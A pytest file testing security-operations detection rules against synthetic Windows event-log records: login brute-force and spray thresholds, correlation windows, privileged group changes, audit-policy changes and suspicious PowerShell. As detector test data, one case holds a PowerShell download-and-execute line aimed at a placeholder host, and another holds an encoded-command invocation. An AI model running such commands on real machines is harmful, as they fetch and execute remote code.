"""Behavioral checks for analyst signals, correlation limits, and false positives."""

from datetime import datetime, timedelta, timezone

import pytest

from soc.detections import RULES, detect
from soc.models import Event


START = datetime(2026, 9, 21, 9, 0, tzinfo=timezone.utc)


def event(event_id=4625, *, seconds=0, key="event", account="alice", domain="CORP",
          source="192.0.2.10", host="DC01", details=None):
    return Event(
        id=key,
        timestamp=START + timedelta(seconds=seconds),
        event_id=event_id,
        host=host,
        account=account,
        domain=domain,
        source_ip=source,
        details=details or {},
        raw={},
    )


def failures(*, count=5, spacing=30, **kwargs):
    return [event(seconds=index * spacing, key=f"failure-{index}", **kwargs)
            for index in range(count)]


def findings(events, rule_id):
    return [alert for alert in detect(events) if alert.rule_id == rule_id]


def test_failed_login_burst_produces_investigable_evidence():
    evidence = failures()
    alerts = findings(evidence, "failed_login_burst")
    assert alerts
    alert = alerts[0]
    assert alert.severity in {"medium", "high"}
    assert set(alert.evidence_ids) == {item.id for item in evidence}
    assert alert.account == "CORP\\alice"
    assert alert.source_ip == "192.0.2.10"
    assert alert.description
    assert alert.recommended_actions
    assert alert.false_positives
    assert any(item["id"].startswith("T1110") for item in alert.mitre)


def test_failed_login_burst_accepts_inclusive_five_minute_boundary():
    events = [event(seconds=seconds, key=f"failure-{index}")
              for index, seconds in enumerate([0, 60, 120, 180, 300])]
    assert findings(events, "failed_login_burst")


def test_failed_login_burst_excludes_events_outside_window():
    events = [event(seconds=seconds, key=f"failure-{index}")
              for index, seconds in enumerate([0, 60, 120, 180, 301])]
    assert not findings(events, "failed_login_burst")


@pytest.mark.parametrize("field,other", [
    ("source_ip", "192.0.2.20"),
    ("host", "DC02"),
    ("account", "bob"),
    ("domain", "OTHER"),
])
def test_failed_login_burst_keeps_distinct_identities_separate(field, other):
    events = failures(count=3)
    translated = {"source_ip": "source"}.get(field, field)
    events += [event(seconds=100 + index, key=f"different-{index}", **{translated: other})
               for index in range(2)]
    assert not findings(events, "failed_login_burst")


def test_failed_login_burst_ignores_case_in_windows_identities():
    events = failures(count=3)
    events += [event(seconds=100 + index, key=f"mixed-case-{index}",
                     account="ALICE", domain="corp", host="dc01")
               for index in range(2)]
    assert findings(events, "failed_login_burst")


def test_password_spray_requires_multiple_accounts_and_enough_attempts():
    events = [event(seconds=index * 20, key=f"spray-{index}", account=f"user{index % 5}")
              for index in range(8)]
    alerts = findings(events, "password_spray")
    assert alerts
    assert alerts[0].severity == "high"
    assert len(alerts[0].evidence_ids) == 8
    assert any(item["id"] == "T1110.003" for item in alerts[0].mitre)


@pytest.mark.parametrize("count,accounts", [(7, 5), (8, 4), (10, 1)])
def test_password_spray_does_not_overstate_small_or_single_account_bursts(count, accounts):
    events = [event(seconds=index, key=f"attempt-{index}", account=f"user{index % accounts}")
              for index in range(count)]
    assert not findings(events, "password_spray")


def test_password_spray_does_not_combine_unrelated_sources():
    events = [event(seconds=index, key=f"attempt-{index}", account=f"user{index}",
                    source="192.0.2.10" if index < 4 else "192.0.2.20")
              for index in range(8)]
    assert not findings(events, "password_spray")


def test_password_spray_counts_same_username_in_different_domains_separately():
    events = [event(seconds=index, key=f"attempt-{index}", account="service",
                    domain=f"DOMAIN{index % 5}")
              for index in range(8)]
    assert findings(events, "password_spray")


def test_success_after_repeated_failures_includes_failure_and_success_evidence():
    events = failures() + [event(4624, seconds=150, key="success")]
    alerts = findings(events, "success_after_failures")
    assert alerts
    assert alerts[0].severity == "high"
    assert set(alerts[0].evidence_ids) == {item.id for item in events}
    assert any(item["id"] == "T1110.001" for item in alerts[0].mitre)


@pytest.mark.parametrize("kwargs", [
    {"source": "192.0.2.20"},
    {"account": "bob"},
    {"domain": "OTHER"},
])
def test_success_after_failures_matches_source_and_account_domain(kwargs):
    events = failures() + [event(4624, seconds=150, key="unrelated-success", **kwargs)]
    assert not findings(events, "success_after_failures")


def test_success_after_failures_requires_matching_observed_host():
    events = failures() + [event(4624, seconds=150, key="success", host="APP01")]
    assert not findings(events, "success_after_failures")


def test_success_after_failures_accepts_inclusive_ten_minute_boundary():
    events = failures(spacing=0) + [event(4624, seconds=600, key="success")]
    assert findings(events, "success_after_failures")


def test_success_after_failures_excludes_expired_failures():
    events = failures(spacing=0) + [event(4624, seconds=601, key="success")]
    assert not findings(events, "success_after_failures")


def test_repeated_successes_do_not_reuse_a_closed_failure_sequence():
    events = failures() + [event(4624, seconds=150, key="first-success"),
                           event(4624, seconds=180, key="second-success")]
    alerts = findings(events, "success_after_failures")
    assert len(alerts) == 1
    assert "first-success" in alerts[0].evidence_ids
    assert "second-success" not in alerts[0].evidence_ids


def test_a_new_failure_sequence_after_success_can_produce_a_new_finding():
    first = failures() + [event(4624, seconds=150, key="first-success")]
    later = [event(seconds=210 + index * 30, key=f"later-failure-{index}")
             for index in range(5)]
    later += [event(4624, seconds=360, key="second-success")]
    alerts = findings(first + later, "success_after_failures")
    assert len(alerts) == 2
    evidence_sets = {frozenset(alert.evidence_ids) for alert in alerts}
    assert evidence_sets == {frozenset(item.id for item in first),
                             frozenset(item.id for item in later)}


def test_success_cannot_be_correlated_with_simultaneous_or_later_failures():
    assert not findings(failures(spacing=0) + [event(4624, key="success")],
                        "success_after_failures")
    assert not findings([event(4624, key="success")] + failures(),
                        "success_after_failures")


def test_new_user_creation_is_visible_without_login_activity():
    alerts = findings([event(4720, key="new-user", account="new.employee")], "new_user")
    assert len(alerts) == 1
    assert alerts[0].account == "CORP\\new.employee"
    assert alerts[0].mitre


@pytest.mark.parametrize("event_id", [4728, 4732, 4756])
def test_privileged_group_additions_are_high_severity(event_id):
    alerts = findings([event(event_id, details={"group_name": "Domain Admins",
                                              "member_name": "CORP\\alice"})],
                      "privileged_group_change")
    assert len(alerts) == 1
    assert alerts[0].severity == "high"
    assert alerts[0].mitre


@pytest.mark.parametrize("event_id", [4729, 4733, 4757])
def test_privileged_group_removals_are_reviewable_changes(event_id):
    alerts = findings([event(event_id, details={"group_name": "Administrators"})],
                      "privileged_group_change")
    assert len(alerts) == 1
    assert alerts[0].severity == "medium"


@pytest.mark.parametrize("sid", ["S-1-5-32-544", "S-1-5-21-123-456-789-512"])
def test_privileged_groups_can_be_identified_by_sid_for_localized_names(sid):
    events = [event(4732, details={"group_name": "Localized group", "group_sid": sid})]
    assert findings(events, "privileged_group_change")


def test_ordinary_group_membership_is_not_called_privilege_escalation():
    events = [event(4732, details={"group_name": "Marketing",
                                 "group_sid": "S-1-5-21-123-456-789-1107"})]
    assert not findings(events, "privileged_group_change")


def test_group_change_with_no_group_identity_is_not_speculative():
    assert not findings([event(4732)], "privileged_group_change")


@pytest.mark.parametrize("event_id,details", [
    (4104, {"script_block_text": "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/payload')"}),
    (4688, {"process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "powershell.exe -NoProfile -EncodedCommand SQBFAFgA"}),
])
def test_suspicious_powershell_requires_observable_command_content(event_id, details):
    alerts = findings([event(event_id, details=details)], "suspicious_powershell")
    assert len(alerts) == 1
    assert alerts[0].severity in {"medium", "high"}
    assert any(item["id"] == "T1059.001" for item in alerts[0].mitre)


@pytest.mark.parametrize("event_id,details", [
    (4104, {"script_block_text": "Get-Service | Where-Object Status -eq Running"}),
    (4688, {"process_name": "powershell.exe", "command_line": "powershell.exe Get-Date"}),
    (4688, {"process_name": "ordinary-tool.exe", "command_line": "ordinary-tool.exe -EncodedCommand foo"}),
    (4104, {}),
])
def test_benign_or_missing_powershell_content_does_not_raise_an_alert(event_id, details):
    assert not findings([event(event_id, details=details)], "suspicious_powershell")


def test_account_lockout_is_visible_but_not_automatically_proof_of_attack():
    alerts = findings([event(4740, key="lockout")], "account_lockout")
    assert len(alerts) == 1
    assert alerts[0].severity == "medium"
    assert alerts[0].recommended_actions


@pytest.mark.parametrize("event_id,severity", [(1102, "high"), (5025, "high"),
                                               (4719, "medium"), (4946, "medium"),
                                               (4947, "medium"), (4948, "medium")])
def test_security_control_changes_are_visible_at_appropriate_severity(event_id, severity):
    alerts = findings([event(event_id, key=f"control-{event_id}")], "security_control_change")
    assert len(alerts) == 1
    assert alerts[0].severity == severity


def test_generic_audit_policy_change_does_not_claim_disable_without_evidence():
    alerts = findings([event(4719, details={"change": "Policy changed"})],
                      "security_control_change")
    assert alerts[0].severity == "medium"
    assert not alerts[0].mitre


@pytest.mark.parametrize("change", ["Success removed", "%%8448"])
def test_explicit_audit_coverage_reduction_is_high_severity(change):
    alerts = findings([event(4719, details={"change": change})], "security_control_change")
    assert alerts[0].severity == "high"
    assert any(item["id"] == "T1685.001" for item in alerts[0].mitre)


@pytest.mark.parametrize("change", ["Success added", "%%8449"])
def test_audit_coverage_addition_is_a_reviewable_change(change):
    alerts = findings([event(4719, details={"change": change})], "security_control_change")
    assert alerts[0].severity == "medium"
    assert not alerts[0].mitre


def test_unsupported_and_benign_events_are_retained_without_invented_detections():
    events = [event(9999, key="unsupported"), event(4624, key="benign-success"),
              event(4688, key="normal-process", details={"process_name": "notepad.exe"})]
    assert detect(events) == []


def test_missing_identity_or_source_does_not_form_login_correlations():
    assert not findings(failures(account="", source=""), "failed_login_burst")
    assert not findings(failures(account="", source="") + [event(4624, seconds=150,
                                                                key="success", account="", source="")],
                        "success_after_failures")


def test_repeated_identical_events_do_not_inflate_failed_login_threshold():
    single = event(key="same-record")
    assert not findings([single] * 10, "failed_login_burst")
    assert not findings([single] * 10, "password_spray")


def test_detection_is_independent_of_input_order_and_has_stable_alert_ids():
    events = failures() + [event(4624, seconds=150, key="success"),
                           event(4720, seconds=200, key="new-user")]
    forward = detect(events)
    reverse = detect(list(reversed(events)))
    assert [(alert.id, alert.rule_id, alert.evidence_ids) for alert in forward] == [
        (alert.id, alert.rule_id, alert.evidence_ids) for alert in reverse]


def test_valid_ancient_utc_timestamp_does_not_depend_on_platform_epoch_conversion():
    ancient = Event(id="ancient-event", timestamp=datetime(1, 1, 1, tzinfo=timezone.utc),
                    event_id=4720, host="dc01", account="alice")
    alerts = findings([ancient], "new_user")
    assert len(alerts) == 1
    assert alerts[0].timestamp == ancient.timestamp


def test_every_required_rule_is_registered():
    assert {"failed_login_burst", "password_spray", "success_after_failures", "new_user",
            "privileged_group_change", "suspicious_powershell", "account_lockout",
            "security_control_change"} <= set(RULES)
